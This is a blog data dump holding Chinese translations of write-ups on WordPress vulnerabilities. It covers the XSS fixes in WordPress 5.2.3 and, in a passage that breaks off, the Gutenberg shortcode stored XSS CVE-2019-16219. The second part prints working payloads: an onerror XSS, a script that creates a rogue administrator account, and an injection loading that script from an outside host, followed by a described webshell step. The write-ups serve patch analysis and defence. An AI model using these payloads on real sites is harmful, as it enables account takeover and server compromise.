languages*”问题。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111010-fd8ecbca-da8a-1.png)<https://core.trac.wordpress.org/changeset/45935>\n\n事实证明，它可能使具有某种权限的攻击者（如contributors投稿者）将XSS存储在陷阱帖中。要使该攻击起作用，需要具有更高权限的另一个用户（如管理员）预览该帖子。\n\n利用此漏洞的一种可行方法是：恶意的contributors身份用户在其帖子中添加锚标签指向：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111024-05f72730-da8b-1.png)\n **％u003A**部分将被回调函数解码，从而导致代码变为\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111033-0b764290-da8b-1.png)\n 这将被解析为JavaScript，并在单击该锚链接后启动弹框。\n\n## 在评论中存在存储型XSS漏洞\n\n更新日志中提到以下内容：\n\n**“第二个是存储评论中的跨站点脚本漏洞。”**\n\n从技术角度来看，这条线是模棱两可的。可以通过两种不同的方式来理解：\n\n1.    被修复的issue是影响 WordPress 评论系统存储的XSS漏洞\n\n2.    可以通过使用存储在网站上的评论来利用此漏洞，这意味着需要执行更多步骤才能成功进行攻击。\n\n初步分析显示，这可能是后者，并且需要使用攻击者的评论，使得站点管理员执行一些非常具体的步骤。如果这是唯一可以利用此漏洞的情况，我们*高度*怀疑是否会在实战中看到尝试利用此漏洞的案例。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111050-156bc5a4-da8b-1.png)<https://core.trac.wordpress.org/changeset/45990/>\n\n在更改中可见， **wp_rel_nofollow_callback****函数**被用来调用**shortcode_parse_atts函数从而分析**HTML标签属性。虽然此用例接近其设计目的，但是短代码提供了常规HTML标签所没有的一些功能，如：[支持类似C的转义序列](https://en.wikipedia.org/wiki/Escape_sequences_in_C)。\n\n这是一个大问题，因为如果检测到**rel**属性，解码值将重新追加到最终注释中。不幸的是，对于攻击者来说，普通游客不可能直接在评论中添加该属性，因为[wp_kses](https://codex.wordpress.org/Function_Reference/wp_kses)并没有明确该属性，因此需要执行多个步骤。\n\n攻击流程如下：\n\n1.    攻击者发布恶意评论，其中包含以下内容的锚点：**href =“javascript \\ x3aalert（1）;”**。\n\n2.    该**wp_rel_nofollow_callback**自动添加一个**rel=” nofollow”**属性的标签。\n\n3.    管理员需要在管理仪表板上打开注释编辑视图，并不修改任何内容的情况下重新保存该注释。这将强制脚本解码该标记所有属性中的转义序列。然后**href**属性将包含**javascript：alert（1）;** 允许Javascript代码在单击该链接时运行。\n\n## 媒体上传中存在反射型XSS\n\n仅当用户尝试使用特制文件名上传文件时，而他无权在此上下文中上传文件，才会发生此漏洞，。\n\n这可能是以下几种情况之一：\n\n1. 用户根本无法上传文件。\n\n3. 用户无法上传指定帖子上的文件。\n\n5. 用户尝试使用无效文件替换标题或背景图像。\n\n包含文件名和HTML内容类型的响应将包含XSS。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111107-1f37ec0c-da8b-1.png)\n\n由于此操作受**nonce**保护，因此不能在跨站点请求伪造（CSRF）中用它来攻击其他用户。\n\n通过在所有场景下使用**esc_html**转义文件名以及将**text/ html**中响应的内容类型替换为**text / plain**来修复此漏洞。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111123-294d8666-da8b-1.png)\n\n您可以在此处查看WordPress trac上的完整更改日志：[https](https://core.trac.wordpress.org/changeset/45936)：[//core.trac.wordpress.org/changeset/45936](https://core.trac.wordpress.org/changeset/45936)\n\n## URL清理问题\n\n[esc_url函数](https://codex.wordpress.org/Function_Reference/esc_url)用于清理URL，以便可以安全地将其附加到HTML标记属性的上下文中。遗憾的是，由于**esc_url**中用来验证给定URL中使用协议的**wp_kses_bad_protocol_once**函数中存在漏洞，有一些方法可以绕过**esc_url**的保护。\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111143-34c6962c-da8b-1.png)<https://core.trac.wordpress.org/changeset/45997>\n\n根据补丁，此函数在处理不完整的HTML实体时，可能无法检测到恶意协议，即使它们缺少结束分号，浏览器仍然可以正确解码这些实体。\n\n因此，攻击者可以使用如下URL来绕过该保护：\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190919111159-3e6352d8-da8b-1.png)\n\n## JQuery更新修补“原型污染”\n\nWordPress使用[最新的安全更新](https://core.trac.wordpress.org/ticket/47020)修补了其JQuery版本。\n\n此更新消除了利用原型污染漏洞攻击的可能性。目前并没有使用该技术的已知漏洞。\n\n# 结论\n\n逆推安全补丁是一项有趣的挑战。仅仅使用补丁，你就要推断出基本的意图是什么。有时，这是一项琐碎的练习，修复与问题之间存在直接关系。\n\n其他时候，正如这个版本所阐明的那样，你必须后退一步，才有更大的格局; 研究点与点之间如何互连; 排除攻击者会攻击的明显死角，剩下的东西往往是你正在寻找的问题所在。\n\n如果您的WordPress安装尚未自动更新，我们强烈建议您尽快升级。\n\n原文链接：https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html","slug":"wordpress5-update","published":1,"updated":"2020-10-27T09:27:09.808Z","_id":"ckgrozua9005mwsa9ee89bcma","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RISP等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>\n<a id=\"more\"></a>\n\n<p>这篇文章是来自Sucuri安全公司的Marc-Alexandre Montpas，他对于WordPress 5.2.3安全更新进行了diff后，对更新的内容提出了自己的见解。文章中虽然没有给出明确的利用，但是针对安全补丁分析与逆推的思路，却很好玩。</p>\n<p>正如作者本人说的</p>\n<p><strong>“Reversing security patches is an interesting challenge”</strong></p>\n<p>下面翻译稿正文开始</p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>上周，<a href=\"https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/\">WordPress发布了5.2.3版本</a>，此版本是一个安全维护更新版本，因此包含许多安全修复程序。我们日常工作的一部分是分析这些安全版本，发现它正在修复的安全问题，并为进一步的内测制作poc。</p>\n<p>基于我们的分析，此版本并没有高危漏洞被修复。已修复的漏洞都需要某种程度的限制，像是需要用户交互或拥有高权限帐户。在某些情况下，这些漏洞这只能由目标主动触发，在这种情况下，为了成功利用它们，需要进行一些细致的社会工程学工作。</p>\n<p>尽管如此，您还是应该及时更新您的站点以保护自己免受这些攻击。</p>\n<p>本文提供了更多关于WordPress 5.2.3版本修复漏洞过程中的有趣细节。</p>\n<h1 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h1><h2 id=\"在Post-Preview中存在存储型XSS漏洞\"><a href=\"#在Post-Preview中存在存储型XSS漏洞\" class=\"headerlink\" title=\"在Post Preview中存在存储型XSS漏洞\"></a>在Post Preview中存在存储型XSS漏洞</h2><p>WordPress似乎有一段旧代码，它最初旨在通过将UTF-8 URL编码为HTML实体来解决<em>“JavaScript bug with foreign languages</em>”问题。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111010-fd8ecbca-da8a-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45935\">https://core.trac.wordpress.org/changeset/45935</a></p>\n<p>事实证明，它可能使具有某种权限的攻击者（如contributors投稿者）将XSS存储在陷阱帖中。要使该攻击起作用，需要具有更高权限的另一个用户（如管理员）预览该帖子。</p>\n<p>利用此漏洞的一种可行方法是：恶意的contributors身份用户在其帖子中添加锚标签指向：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111024-05f72730-da8b-1.png\"><br> <strong>％u003A</strong>部分将被回调函数解码，从而导致代码变为</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111033-0b764290-da8b-1.png\"><br> 这将被解析为JavaScript，并在单击该锚链接后启动弹框。</p>\n<h2 id=\"在评论中存在存储型XSS漏洞\"><a href=\"#在评论中存在存储型XSS漏洞\" class=\"headerlink\" title=\"在评论中存在存储型XSS漏洞\"></a>在评论中存在存储型XSS漏洞</h2><p>更新日志中提到以下内容：</p>\n<p><strong>“第二个是存储评论中的跨站点脚本漏洞。”</strong></p>\n<p>从技术角度来看，这条线是模棱两可的。可以通过两种不同的方式来理解：</p>\n<ol>\n<li><p>被修复的issue是影响 WordPress 评论系统存储的XSS漏洞</p>\n</li>\n<li><p>可以通过使用存储在网站上的评论来利用此漏洞，这意味着需要执行更多步骤才能成功进行攻击。</p>\n</li>\n</ol>\n<p>初步分析显示，这可能是后者，并且需要使用攻击者的评论，使得站点管理员执行一些非常具体的步骤。如果这是唯一可以利用此漏洞的情况，我们<em>高度</em>怀疑是否会在实战中看到尝试利用此漏洞的案例。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111050-156bc5a4-da8b-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45990/\">https://core.trac.wordpress.org/changeset/45990/</a></p>\n<p>在更改中可见， <strong>wp_rel_nofollow_callback**</strong>函数<strong>被用来调用</strong>shortcode_parse_atts函数从而分析**HTML标签属性。虽然此用例接近其设计目的，但是短代码提供了常规HTML标签所没有的一些功能，如：<a href=\"https://en.wikipedia.org/wiki/Escape_sequences_in_C\">支持类似C的转义序列</a>。</p>\n<p>这是一个大问题，因为如果检测到<strong>rel</strong>属性，解码值将重新追加到最终注释中。不幸的是，对于攻击者来说，普通游客不可能直接在评论中添加该属性，因为<a href=\"https://codex.wordpress.org/Function_Reference/wp_kses\">wp_kses</a>并没有明确该属性，因此需要执行多个步骤。</p>\n<p>攻击流程如下：</p>\n<ol>\n<li><p>攻击者发布恶意评论，其中包含以下内容的锚点：<strong>href =“javascript \\ x3aalert（1）;”</strong>。</p>\n</li>\n<li><p>该<strong>wp_rel_nofollow_callback</strong>自动添加一个<strong>rel=” nofollow”</strong>属性的标签。</p>\n</li>\n<li><p>管理员需要在管理仪表板上打开注释编辑视图，并不修改任何内容的情况下重新保存该注释。这将强制脚本解码该标记所有属性中的转义序列。然后<strong>href</strong>属性将包含<strong>javascript：alert（1）;</strong> 允许Javascript代码在单击该链接时运行。</p>\n</li>\n</ol>\n<h2 id=\"媒体上传中存在反射型XSS\"><a href=\"#媒体上传中存在反射型XSS\" class=\"headerlink\" title=\"媒体上传中存在反射型XSS\"></a>媒体上传中存在反射型XSS</h2><p>仅当用户尝试使用特制文件名上传文件时，而他无权在此上下文中上传文件，才会发生此漏洞，。</p>\n<p>这可能是以下几种情况之一：</p>\n<ol>\n<li><p>用户根本无法上传文件。</p>\n</li>\n<li><p>用户无法上传指定帖子上的文件。</p>\n</li>\n<li><p>用户尝试使用无效文件替换标题或背景图像。</p>\n</li>\n</ol>\n<p>包含文件名和HTML内容类型的响应将包含XSS。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111107-1f37ec0c-da8b-1.png\"></p>\n<p>由于此操作受<strong>nonce</strong>保护，因此不能在跨站点请求伪造（CSRF）中用它来攻击其他用户。</p>\n<p>通过在所有场景下使用<strong>esc_html</strong>转义文件名以及将<strong>text/ html</strong>中响应的内容类型替换为<strong>text / plain</strong>来修复此漏洞。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111123-294d8666-da8b-1.png\"></p>\n<p>您可以在此处查看WordPress trac上的完整更改日志：<a href=\"https://core.trac.wordpress.org/changeset/45936\">https</a>：<a href=\"https://core.trac.wordpress.org/changeset/45936\">//core.trac.wordpress.org/changeset/45936</a></p>\n<h2 id=\"URL清理问题\"><a href=\"#URL清理问题\" class=\"headerlink\" title=\"URL清理问题\"></a>URL清理问题</h2><p><a href=\"https://codex.wordpress.org/Function_Reference/esc_url\">esc_url函数</a>用于清理URL，以便可以安全地将其附加到HTML标记属性的上下文中。遗憾的是，由于<strong>esc_url</strong>中用来验证给定URL中使用协议的<strong>wp_kses_bad_protocol_once</strong>函数中存在漏洞，有一些方法可以绕过<strong>esc_url</strong>的保护。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111143-34c6962c-da8b-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45997\">https://core.trac.wordpress.org/changeset/45997</a></p>\n<p>根据补丁，此函数在处理不完整的HTML实体时，可能无法检测到恶意协议，即使它们缺少结束分号，浏览器仍然可以正确解码这些实体。</p>\n<p>因此，攻击者可以使用如下URL来绕过该保护：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111159-3e6352d8-da8b-1.png\"></p>\n<h2 id=\"JQuery更新修补“原型污染”\"><a href=\"#JQuery更新修补“原型污染”\" class=\"headerlink\" title=\"JQuery更新修补“原型污染”\"></a>JQuery更新修补“原型污染”</h2><p>WordPress使用<a href=\"https://core.trac.wordpress.org/ticket/47020\">最新的安全更新</a>修补了其JQuery版本。</p>\n<p>此更新消除了利用原型污染漏洞攻击的可能性。目前并没有使用该技术的已知漏洞。</p>\n<h1 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h1><p>逆推安全补丁是一项有趣的挑战。仅仅使用补丁，你就要推断出基本的意图是什么。有时，这是一项琐碎的练习，修复与问题之间存在直接关系。</p>\n<p>其他时候，正如这个版本所阐明的那样，你必须后退一步，才有更大的格局; 研究点与点之间如何互连; 排除攻击者会攻击的明显死角，剩下的东西往往是你正在寻找的问题所在。</p>\n<p>如果您的WordPress安装尚未自动更新，我们强烈建议您尽快升级。</p>\n<p>原文链接：<a href=\"https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html\">https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","excerpt":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RISP等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>","more":"<p>这篇文章是来自Sucuri安全公司的Marc-Alexandre Montpas，他对于WordPress 5.2.3安全更新进行了diff后，对更新的内容提出了自己的见解。文章中虽然没有给出明确的利用，但是针对安全补丁分析与逆推的思路，却很好玩。</p>\n<p>正如作者本人说的</p>\n<p><strong>“Reversing security patches is an interesting challenge”</strong></p>\n<p>下面翻译稿正文开始</p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>上周，<a href=\"https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/\">WordPress发布了5.2.3版本</a>，此版本是一个安全维护更新版本，因此包含许多安全修复程序。我们日常工作的一部分是分析这些安全版本，发现它正在修复的安全问题，并为进一步的内测制作poc。</p>\n<p>基于我们的分析，此版本并没有高危漏洞被修复。已修复的漏洞都需要某种程度的限制，像是需要用户交互或拥有高权限帐户。在某些情况下，这些漏洞这只能由目标主动触发，在这种情况下，为了成功利用它们，需要进行一些细致的社会工程学工作。</p>\n<p>尽管如此，您还是应该及时更新您的站点以保护自己免受这些攻击。</p>\n<p>本文提供了更多关于WordPress 5.2.3版本修复漏洞过程中的有趣细节。</p>\n<h1 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h1><h2 id=\"在Post-Preview中存在存储型XSS漏洞\"><a href=\"#在Post-Preview中存在存储型XSS漏洞\" class=\"headerlink\" title=\"在Post Preview中存在存储型XSS漏洞\"></a>在Post Preview中存在存储型XSS漏洞</h2><p>WordPress似乎有一段旧代码，它最初旨在通过将UTF-8 URL编码为HTML实体来解决<em>“JavaScript bug with foreign languages</em>”问题。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111010-fd8ecbca-da8a-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45935\">https://core.trac.wordpress.org/changeset/45935</a></p>\n<p>事实证明，它可能使具有某种权限的攻击者（如contributors投稿者）将XSS存储在陷阱帖中。要使该攻击起作用，需要具有更高权限的另一个用户（如管理员）预览该帖子。</p>\n<p>利用此漏洞的一种可行方法是：恶意的contributors身份用户在其帖子中添加锚标签指向：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111024-05f72730-da8b-1.png\"><br> <strong>％u003A</strong>部分将被回调函数解码，从而导致代码变为</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111033-0b764290-da8b-1.png\"><br> 这将被解析为JavaScript，并在单击该锚链接后启动弹框。</p>\n<h2 id=\"在评论中存在存储型XSS漏洞\"><a href=\"#在评论中存在存储型XSS漏洞\" class=\"headerlink\" title=\"在评论中存在存储型XSS漏洞\"></a>在评论中存在存储型XSS漏洞</h2><p>更新日志中提到以下内容：</p>\n<p><strong>“第二个是存储评论中的跨站点脚本漏洞。”</strong></p>\n<p>从技术角度来看，这条线是模棱两可的。可以通过两种不同的方式来理解：</p>\n<ol>\n<li><p>被修复的issue是影响 WordPress 评论系统存储的XSS漏洞</p>\n</li>\n<li><p>可以通过使用存储在网站上的评论来利用此漏洞，这意味着需要执行更多步骤才能成功进行攻击。</p>\n</li>\n</ol>\n<p>初步分析显示，这可能是后者，并且需要使用攻击者的评论，使得站点管理员执行一些非常具体的步骤。如果这是唯一可以利用此漏洞的情况，我们<em>高度</em>怀疑是否会在实战中看到尝试利用此漏洞的案例。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111050-156bc5a4-da8b-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45990/\">https://core.trac.wordpress.org/changeset/45990/</a></p>\n<p>在更改中可见， <strong>wp_rel_nofollow_callback**</strong>函数<strong>被用来调用</strong>shortcode_parse_atts函数从而分析**HTML标签属性。虽然此用例接近其设计目的，但是短代码提供了常规HTML标签所没有的一些功能，如：<a href=\"https://en.wikipedia.org/wiki/Escape_sequences_in_C\">支持类似C的转义序列</a>。</p>\n<p>这是一个大问题，因为如果检测到<strong>rel</strong>属性，解码值将重新追加到最终注释中。不幸的是，对于攻击者来说，普通游客不可能直接在评论中添加该属性，因为<a href=\"https://codex.wordpress.org/Function_Reference/wp_kses\">wp_kses</a>并没有明确该属性，因此需要执行多个步骤。</p>\n<p>攻击流程如下：</p>\n<ol>\n<li><p>攻击者发布恶意评论，其中包含以下内容的锚点：<strong>href =“javascript \\ x3aalert（1）;”</strong>。</p>\n</li>\n<li><p>该<strong>wp_rel_nofollow_callback</strong>自动添加一个<strong>rel=” nofollow”</strong>属性的标签。</p>\n</li>\n<li><p>管理员需要在管理仪表板上打开注释编辑视图，并不修改任何内容的情况下重新保存该注释。这将强制脚本解码该标记所有属性中的转义序列。然后<strong>href</strong>属性将包含<strong>javascript：alert（1）;</strong> 允许Javascript代码在单击该链接时运行。</p>\n</li>\n</ol>\n<h2 id=\"媒体上传中存在反射型XSS\"><a href=\"#媒体上传中存在反射型XSS\" class=\"headerlink\" title=\"媒体上传中存在反射型XSS\"></a>媒体上传中存在反射型XSS</h2><p>仅当用户尝试使用特制文件名上传文件时，而他无权在此上下文中上传文件，才会发生此漏洞，。</p>\n<p>这可能是以下几种情况之一：</p>\n<ol>\n<li><p>用户根本无法上传文件。</p>\n</li>\n<li><p>用户无法上传指定帖子上的文件。</p>\n</li>\n<li><p>用户尝试使用无效文件替换标题或背景图像。</p>\n</li>\n</ol>\n<p>包含文件名和HTML内容类型的响应将包含XSS。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111107-1f37ec0c-da8b-1.png\"></p>\n<p>由于此操作受<strong>nonce</strong>保护，因此不能在跨站点请求伪造（CSRF）中用它来攻击其他用户。</p>\n<p>通过在所有场景下使用<strong>esc_html</strong>转义文件名以及将<strong>text/ html</strong>中响应的内容类型替换为<strong>text / plain</strong>来修复此漏洞。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111123-294d8666-da8b-1.png\"></p>\n<p>您可以在此处查看WordPress trac上的完整更改日志：<a href=\"https://core.trac.wordpress.org/changeset/45936\">https</a>：<a href=\"https://core.trac.wordpress.org/changeset/45936\">//core.trac.wordpress.org/changeset/45936</a></p>\n<h2 id=\"URL清理问题\"><a href=\"#URL清理问题\" class=\"headerlink\" title=\"URL清理问题\"></a>URL清理问题</h2><p><a href=\"https://codex.wordpress.org/Function_Reference/esc_url\">esc_url函数</a>用于清理URL，以便可以安全地将其附加到HTML标记属性的上下文中。遗憾的是，由于<strong>esc_url</strong>中用来验证给定URL中使用协议的<strong>wp_kses_bad_protocol_once</strong>函数中存在漏洞，有一些方法可以绕过<strong>esc_url</strong>的保护。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111143-34c6962c-da8b-1.png\"><a href=\"https://core.trac.wordpress.org/changeset/45997\">https://core.trac.wordpress.org/changeset/45997</a></p>\n<p>根据补丁，此函数在处理不完整的HTML实体时，可能无法检测到恶意协议，即使它们缺少结束分号，浏览器仍然可以正确解码这些实体。</p>\n<p>因此，攻击者可以使用如下URL来绕过该保护：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190919111159-3e6352d8-da8b-1.png\"></p>\n<h2 id=\"JQuery更新修补“原型污染”\"><a href=\"#JQuery更新修补“原型污染”\" class=\"headerlink\" title=\"JQuery更新修补“原型污染”\"></a>JQuery更新修补“原型污染”</h2><p>WordPress使用<a href=\"https://core.trac.wordpress.org/ticket/47020\">最新的安全更新</a>修补了其JQuery版本。</p>\n<p>此更新消除了利用原型污染漏洞攻击的可能性。目前并没有使用该技术的已知漏洞。</p>\n<h1 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h1><p>逆推安全补丁是一项有趣的挑战。仅仅使用补丁，你就要推断出基本的意图是什么。有时，这是一项琐碎的练习，修复与问题之间存在直接关系。</p>\n<p>其他时候，正如这个版本所阐明的那样，你必须后退一步，才有更大的格局; 研究点与点之间如何互连; 排除攻击者会攻击的明显死角，剩下的东西往往是你正在寻找的问题所在。</p>\n<p>如果您的WordPress安装尚未自动更新，我们强烈建议您尽快升级。</p>\n<p>原文链接：<a href=\"https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html\">https://blog.sucuri.net/2019/09/dissecting-the-wordpress-5-2-3-update.html</a></p>"},{"title":"【翻译】浅析WordPress5.0存储型XSS漏洞","date":"2019-09-23T06:30:26.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n<!--more-->\n\n这篇文章是来自FortiGuard Labs，本文介绍了存在于wordpress5.0版本中的xss漏洞。经我个人验证，从wordpress5.0版本起，由于强制使用古腾堡(Gutenberg)编辑器，内部存在不少xss漏洞，而本文中的漏洞，一直存在至5.0.5版本，而非文中所说的5.0.4。\n\n下面翻译稿正文开始\n\n## 前言\n\nWordPress 是世界上最受欢迎的内容管理系统 （CMS），它的全球CMS市场份额已达60.4%，远远高于排名第二的Joomla！（后者仅有5.2%市场份额）。因此，互联网上超过三分之一的网站是使用WordPress搭建的。\n\n近日，FortiGuard Labs团队在 WordPress 中发现了一个存储型跨站点脚本 （XSS）0day漏洞。此 XSS 漏洞是由 WordPress 5.0 中的新内置编辑器 Gutenberg 引起的，编辑器无法过滤Shortcode错误消息中的 JavaScript/HTML 代码。一旦受害者访问受感染网页，具有投稿者（Contributor）或更高权限的远程攻击者就可以在其浏览器中执行任意 JavaScript/HTML 代码。倘若受害者具有较高权限（如：管理员），攻击者甚至可以攻陷整个 Web 服务器。\n\n此存储型XSS漏洞（[CVE-2019-16219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219)）影响WordPress 5.0到[5.0.4,5.1](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219)和5.1.1版本。\n\n## 解析\n\n在WordPress 5.0中，用户可以将Shortcode块添加到帖子中。若将某些特定的HTML编码字符（如“＆lt;”）添加到短代码块中，重新打开该帖时，WordPress就会显示错误消息，并将“＆lt;”解码为“<”来进行预览。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141338-c948f9c4-db6d-1.png)\n\n图1.注入HTML编码字符Shortcode块\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141349-cf90eed6-db6d-1.png)\n\n图2.Shortcode错误消息预览\n\n使用PoC代码\n\n```\n\"&gt;&lt;img src=1 onerror=alert(\"熊本熊本熊\")&gt;\n```\n\n可以轻松绕过此预览中的XSS过滤器。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141406-d99b9ad4-db6d-1.png)\n\n图3.将PoC代码插入Shortcode块\n\n当受害者查看该帖时，XSS代码将在其浏览器中执行。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141415-df3c5a5a-db6d-1.png)\n\n图4. WordPress短代码预览XSS\n\n如果受害者恰好拥有管理员权限，攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器。\n\n例如，攻击者可以在其Web服务器上托管JavaScript文件，例如[wpaddadmin [。\\] js](https://g0blin.co.uk/xss-and-wordpress-the-aftermath/)（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“attacker”，密码为“attacker”。\n\n```javascript\n// Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value  \nvar ajaxRequest = new XMLHttpRequest();  \nvar requestURL = \"/wordpress/wp-admin/user-new.php\";  \nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;  \najaxRequest.open(\"GET\", requestURL, false);  \najaxRequest.send();  \nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  \nvar nonce = nonceMatch[1];  \n\n// Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator  \nvar params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator\";  \najaxRequest = new XMLHttpRequest();  \najaxRequest.open(\"POST\", requestURL, true);  \najaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");  \najaxRequest.send(params);\n```\n\n然后，攻击者可以在JavaScript中注入以下PoC代码。\n\n```\n\"&gt;&lt;img src=1 onerror=\"javascript&colon;(function () { var url = 'http://aaa.bbb.ccc.ddd/ wpaddadmin.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();\"&gt;\n```\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141432-e97fa756-db6d-1.png)\n\n图5.注入XSS代码以添加管理员帐户\n\n一旦具有高权限的受害者查看此帖，就会立即创建attacker管理员帐户。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141451-f476286a-db6d-1.png)\n\n图6.执行XSS代码\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141504-fcb25f76-db6d-1.png)\n\n图7.使用XSS代码，成功创建具有管理员权限的“attacker”帐户\n\n随之，攻击者可以将现有的php文件修改为webshell，并借此来控制Web服务器。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141516-038c2df4-db6e-1.png)\n\n图8.使用攻击者的帐户添加webshell\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141526-09a274fa-db6e-1.png)\n\n图9.控制Web服务器\n\n## 解决方案\n\n建议使用受影响版本的WordPress用户，尽快升级到最新版本或立即应用最新的补丁。\n\n翻译正文到此结束\n\n## 写在翻译稿后面\n\n我跟踪了下wordpress的修复\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141538-10bb5d88-db6e-1.png)\n\n本次都修复位于wp-includes\\js\\dist\\block-library.js中\n\n由于原先shortcode的*attributes* 属性中source值为'text'，前端页面在解析shortcode中的&lt;值时，会将其解析为<,从而造成闭合，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141547-15d8ea92-db6e-1.png)\n\n修复后shortcode的*attributes* 